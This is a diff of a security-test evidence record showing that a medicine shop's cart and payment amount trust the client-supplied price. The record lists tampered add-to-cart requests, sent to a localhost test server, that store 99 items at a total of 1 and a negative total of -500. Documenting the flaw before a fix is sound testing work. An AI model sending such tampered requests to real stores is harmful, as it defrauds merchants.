@@ -2,9 +2,9 @@ V-11 The client decides the price and the server stores it
 ==========================================================
 
 state    : BEFORE the fix
-captured : 2026-09-24T17:41:47.965Z
+captured : 2026-09-27T05:50:10.539Z
 branch   : test/it22083500/v11-v15-before-evidence
-commit   : ec2853c
+commit   : 70455f6
 tool     : Node.js v22.20.0 fetch() — requests sent by security-tests/capture-v11-v15.mjs
            (the same attacks with the real curl binary: before-curl.txt in this folder)
 target   : http://localhost:4000  (disposable in-memory database, localhost only)
@@ -12,26 +12,33 @@ target   : http://localhost:4000  (disposable in-memory database, localhost only
 ------------------------------------------------------------------------------
 WHAT THIS PROVES
   The cart never looks the price up. Whatever totalPrice the browser sends is
-  saved as-is, so a patient can put 99 items in the cart for a total of 1.
+  saved as-is — a total of 1 for 99 items, or even a negative total.
 
 METHOD: black box (request tampering, sent by this Node script) + white box (read the source)
+  attacker : dana (Patient, id 6ab8addfc21d788e2815aa07)
 
 STEP 1 — the real price, from the server's own catalogue
-> fetch GET $BASE/api/v1/medicines/search-medicine?search=Testomycin
-  "Testomycin 001"  price 101  (id 6ab560a539b92768520592c8)
+> fetch GET $BASE/api/v1/medicines/get/6ab8addfc21d788e2815aa11
+  "Testomycin 001"  price 101  (id 6ab8addfc21d788e2815aa11)
   99 x 101 = 9999   <-- what the total should be
 
-STEP 2 — logged in as dana (Patient, id 6ab560a539b92768520592be), send a total of 1 instead
+ATTACK 1 — send a total of 1 instead of 9999
 > fetch POST $BASE/api/v1/medicines-cart/add-to-cart [with dana's session cookie]
-  body: {"userId":"6ab560a539b92768520592be","medicineId":"6ab560a539b92768520592c8","quantity":99,"totalPrice":1,"status":"Pending"}
+  body: {"userId":"6ab8addfc21d788e2815aa07","medicineId":"6ab8addfc21d788e2815aa11","quantity":99,"totalPrice":1,"status":"Pending"}
   HTTP 201
-  {"statusCode":201,"data":{"userId":"6ab560a539b92768520592be","medicineId":"6ab560a539b92768520592c8","quantity":99,"totalPrice":1,"status":"Pending","_id":"6ab560db39b92768520594c3","createdAt":"2026-09-24T17:41:47.888Z","updatedAt":"2026-09-24T17:41:47.888Z","__v":0},"message":"Medicine Added to Cart Successfully!"}
+  {"statusCode":201,"data":{"userId":"6ab8addfc21d788e2815aa07","medicineId":"6ab8addfc21d788e2815aa11","quantity":99,"totalPrice":1,"status":"Pending","_id":"6ab8ae92c21d788e2815ac0d","createdAt":"2026-09-27T05:50:10.432Z","updatedAt":"2026-09-27T05:50:10.432Z","__v":0},"message":"Medicine Added to Cart Successfully!"}
+  RESULT: ⚠️  client price accepted: stored quantity=99, totalPrice=1 (honest total is 9999)
 
-  RESULT: stored quantity=99, totalPrice=1 (should be 9999) — client price accepted
+ATTACK 2 — send a NEGATIVE total (-500)
+> fetch POST $BASE/api/v1/medicines-cart/add-to-cart [with dana's session cookie]
+  body: {"userId":"6ab8addfc21d788e2815aa07","medicineId":"61cc59959e609ff265b2a779","quantity":2,"totalPrice":-500,"status":"Pending"}
+  HTTP 201
+  {"statusCode":201,"data":{"userId":"6ab8addfc21d788e2815aa07","medicineId":"61cc59959e609ff265b2a779","quantity":2,"totalPrice":-500,"status":"Pending","_id":"6ab8ae92c21d788e2815ac10","createdAt":"2026-09-27T05:50:10.441Z","updatedAt":"2026-09-27T05:50:10.441Z","__v":0},"message":"Medicine Added to Cart Successfully!"}
+  RESULT: ⚠️  negative total accepted: stored totalPrice=-500
 
 WHITE BOX — where the price comes from
   backend/src/controllers/UserCart.controller.js:8:  const { userId, medicineId, quantity, totalPrice, status } = req.body;
-  backend/src/controllers/payment.controller.js:7:  amount: Number(req.body.amount * 100),
+  backend/src/controllers/payment.controller.js:24:  amount: Number(req.body.amount * 100),
 
   Both the cart total and the Razorpay order amount come straight from req.body.
   Neither reads Medicine.price.
